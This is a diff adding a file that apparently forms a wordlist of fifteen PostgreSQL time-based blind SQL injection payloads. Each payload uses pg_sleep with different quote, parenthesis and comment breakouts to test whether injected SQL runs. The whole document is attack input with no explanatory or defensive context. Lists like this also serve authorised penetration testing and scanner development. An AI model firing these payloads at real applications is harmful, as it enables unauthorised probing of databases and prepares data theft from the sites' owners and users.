@@ -1,0 +1,15 @@
+' OR pg_sleep(5)--
+" OR pg_sleep(5)--
+‘ OR pg_sleep(5) --
+1 OR pg_sleep(5) --
+1) OR pg_sleep(5)--
+1)) OR pg_sleep(5)--
+') OR pg_sleep(5)--
+')) OR pg_sleep(5)--
+or SELECT pg_sleep(5);
+(SELECT pg_sleep(5))
+pg_sleep(5)--
+pg_SLEEP(5)
+pg_SLEEP(5)#
+pg_SLEEP(5)--
+') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
